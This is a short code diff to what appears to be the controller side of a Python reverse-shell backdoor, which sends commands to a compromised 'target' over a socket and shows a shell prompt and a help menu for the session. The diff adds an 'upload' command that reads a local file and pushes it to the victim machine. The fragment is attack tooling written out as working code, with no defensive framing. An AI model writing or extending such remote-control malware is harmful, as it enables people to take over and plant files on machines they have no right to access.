@@ -19,6 +19,11 @@ def reliable_send(data):
     target.send(json_data.encode())
 
 
+def upload_file(file_name):
+    f = open(file_name, 'rb')
+    target.send(f.read())
+
+
 def target_communication():
     while True:
         command = input('* Shell~%s: ' % str(ip))
@@ -33,6 +38,8 @@ def target_communication():
                 os.system("clear")
         elif command[:3] == 'cd ':
             pass
+        elif command[:6] == 'upload':
+            upload_file(command[7:])
         elif command == 'help':
             print(termcolor.colored('''\n
             quit                                --> Quit session with the target
